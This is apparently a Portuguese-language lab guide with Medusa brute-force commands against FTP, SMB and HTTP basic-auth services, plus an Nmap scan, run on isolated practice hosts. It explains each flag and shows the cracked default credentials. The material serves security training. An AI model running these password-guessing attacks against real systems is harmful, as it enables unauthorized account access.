# Exemplos de Comando

Exemplos representativos para os três serviços do desafio — **FTP, SMB e Web** — com cada parâmetro explicado. Todos foram executados no [laboratório isolado](./laboratorio.md) contra alvos descartáveis; as saídas reais estão em [`../images/`](../images/).

> ⚠️ Use apenas no seu laboratório autorizado. Veja [uso-responsavel.md](./uso-responsavel.md).

## Parâmetros da Medusa usados

| Flag | Significado | Observação |
|------|-------------|------------|
| `-h` | Host (alvo) | Nome/IP do alvo de laboratório |
| `-u` | Usuário único | Testa um nome de usuário específico |
| `-U` | Arquivo de usuários | Lista de usuários (um por linha) |
| `-P` | Arquivo de senhas | Wordlist de senhas (uma por linha) |
| `-M` | Módulo do serviço | `ftp`, `smbnt`, `http`, ... |
| `-m` | Opção do módulo | Parâmetro específico do módulo (ex.: `DIR:/` no `http`) |
| `-t` | Threads (paralelismo) | Tentativas simultâneas |
| `-f` | Parar no primeiro sucesso | Encerra ao achar a 1ª credencial válida |

> Dica: `medusa -M <módulo> -q` mostra as opções específicas de cada módulo. `medusa -d` lista todos os módulos disponíveis.

---

## 1. FTP — módulo `ftp`

```bash
medusa -h lab-ftp -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4 -f
```

- `-M ftp` — módulo FTP (porta 21).
- `-U/-P` — percorre cada usuário contra cada senha.
- `-t 4` — 4 tentativas em paralelo.
- `-f` — para no primeiro sucesso.

**Resultado real** (ver [`../images/01-ftp-medusa.txt`](../images/01-ftp-medusa.txt)):

```text
ACCOUNT FOUND: [ftp] Host: lab-ftp User: msfadmin Password: msfadmin [SUCCESS]
```

---

## 2. SMB — módulo `smbnt`

```bash
medusa -h lab-smb -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -t 2 -f
```

- `-M smbnt` — módulo SMB/NetBIOS (portas 139/445).
- Testa a autenticação NTLM contra o compartilhamento Windows/Samba.

**Resultado real** (ver [`../images/02-smb-medusa.txt`](../images/02-smb-medusa.txt)):

```text
ACCOUNT FOUND: [smbnt] Host: lab-smb User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Share Unavailable)]
```

> ⚠️ **Nota técnica:** o módulo `smbnt` da Medusa v2.2 é da era SMBv1. Contra um Samba moderno com SMBv1 desativado, ele retorna `Unknown security mode request: 00` e pode gerar **falsos positivos**. No laboratório, o alvo é configurado com `server min protocol = NT1`, `ntlm auth = yes` e `map to guest = Never` para que apenas a credencial correta autentique (veja [laboratorio.md](./laboratorio.md)).

---

## 3. Web — módulo `http` (autenticação básica)

```bash
medusa -h lab-web -U wordlists/usuarios.txt -P wordlists/senhas.txt -M http -m DIR:/ -t 4 -f
```

- `-M http` — módulo HTTP; por padrão testa **autenticação básica** (HTTP 401 → 200).
- `-m DIR:/` — caminho protegido a atacar.

**Resultado real** (ver [`../images/03-web-http-medusa.txt`](../images/03-web-http-medusa.txt)):

```text
ACCOUNT FOUND: [http] Host: lab-web User: msfadmin Password: msfadmin [SUCCESS]
```

### Sobre o DVWA (formulário web)

O laboratório também sobe o **DVWA**. Diferente da autenticação básica, o DVWA usa **formulário HTML com token CSRF** (`user_token`) e cookie de sessão, o que exige o módulo `web-form` com opções adicionais e um cookie válido. A sintaxe varia por versão da Medusa — confirme com:

```bash
medusa -M web-form -q
```

Como esse fluxo depende de sessão/CSRF e costuma ser capturado interativamente, o exemplo limpo e reprodutível de brute force web aqui é o de **autenticação básica** acima; o DVWA fica disponível para exploração manual.

---

## Reconhecimento (Nmap)

Antes dos ataques, o laboratório é mapeado com Nmap (ver [`../images/00-nmap.txt`](../images/00-nmap.txt)):

```bash
nmap -Pn -sV -p 21,80,139,445 lab-ftp lab-smb lab-web lab-dvwa
```

> Esquema completo do comando e regras em [../specs/001-medusa-brute-force/contracts/medusa-command.md](../specs/001-medusa-brute-force/contracts/medusa-command.md).
